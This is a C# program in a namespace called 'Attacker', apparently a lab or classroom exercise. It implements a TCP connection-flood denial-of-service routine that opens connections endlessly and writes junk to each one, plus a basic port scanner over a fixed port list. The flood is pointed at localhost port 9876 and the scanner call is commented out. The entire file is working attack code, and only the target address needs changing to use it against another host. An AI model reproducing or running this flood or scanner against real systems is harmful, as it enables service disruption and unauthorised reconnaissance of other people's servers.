using System.Net.Sockets;

namespace Attacker;

public class Program
{
    private static void DDOS(string serverIpAddress, int serverPort, ref List<TcpClient> clients)
    {
        try
        {
            while (true)
            {
                var client = new TcpClient(serverIpAddress, serverPort);
                clients.Add(client);
                Console.WriteLine(client.Client.LocalEndPoint);


                Task.Run(() =>
                {
                    while (true)
                    {
                        var message = "HELLO FROM ATTACKER";
                        var data = System.Text.Encoding.ASCII.GetBytes(message);
                        var stream = client.GetStream();
                        stream.Write(data, 0, data.Length);
                    }
                });
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"Error: {e.Message}");
            Console.WriteLine($"Server DDOS'ed");
        }
    }

    private static void PortScanner(string serverIpAddress)
    {
        var ports = new List<int>() { 100, 200, 300, 1000, 4000, 5000, 6000, 58014 };

        foreach (var port in ports)
            using (var scaner = new TcpClient())
            {
                try
                {
                    scaner.Connect(serverIpAddress, port);
                    Console.WriteLine($"[{port}] | OPEN");
                    scaner.GetStream().Close();
                    scaner.Close();
                }
                catch
                {
                    Console.WriteLine($"[{port}] | CLOSED");
                }
            }
    }

    private static void Main(string[] args)
    {
        var serverIpAddress = "127.0.0.1";
        var serverPort = 9876;
        var clients = new List<TcpClient>();

        DDOS(serverIpAddress, serverPort, ref clients);
        //PortScanner(serverIpAddress);
    }
}